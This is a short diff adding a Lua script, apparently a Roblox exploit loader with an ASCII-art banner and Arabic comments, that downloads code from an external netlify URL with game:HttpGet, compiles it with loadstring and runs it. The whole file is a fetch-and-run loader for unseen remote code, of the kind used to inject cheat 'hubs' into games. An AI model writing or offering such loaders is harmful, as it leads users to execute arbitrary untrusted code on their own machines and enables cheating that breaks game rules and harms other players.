@@ -1,0 +1,45 @@
+--[[
+______  _____  _   _ _____ 
+|  _  \/  __ \| | | /  ___|
+| | | || /  \/| | | \ `--. 
+| | | || |    | | | |`--. \
+| |/ / | \__/\| |_| /\__/ /
+|___/   \____/ \___/ \____/ 
+--]]
+
+-- رابط البرنامج النصي الخارجي
+local scriptUrl = "https://luauforge-antiraw.netlify.app/raw/poophub-8rJAYnWmLGHFj5exDEjEFhD"
+
+-- دالة لتنزيل وتشغيل البرنامج النصي بأمان
+local function loadAndRunExternalScript()
+    -- 1. تنزيل الكود باستخدام HttpGet
+    local success, scriptContent = pcall(function()
+        return game:HttpGet(scriptUrl)
+    end)
+
+    if not success then
+        warn("فشل في تنزيل البرنامج النصي: " .. tostring(scriptContent))
+        return
+    end
+
+    -- 2. تحويل الكود إلى دالة باستخدام loadstring
+    local loadSuccess, loadedFunction = pcall(function()
+        return loadstring(scriptContent)
+    end)
+
+    if not loadSuccess or not loadedFunction then
+        warn("فشل في تجميع (loadstring) البرنامج النصي: " .. tostring(loadedFunction))
+        return
+    end
+
+    -- 3. تشغيل الدالة المحملة
+    local runSuccess, runError = pcall(loadedFunction)
+    if not runSuccess then
+        warn("حدث خطأ أثناء تشغيل البرنامج النصي: " .. tostring(runError))
+    else
+        print("تم تحميل وتشغيل البرنامج النصي الخارجي بنجاح.")
+    end
+end
+
+-- التشغيل
+loadAndRunExternalScript()
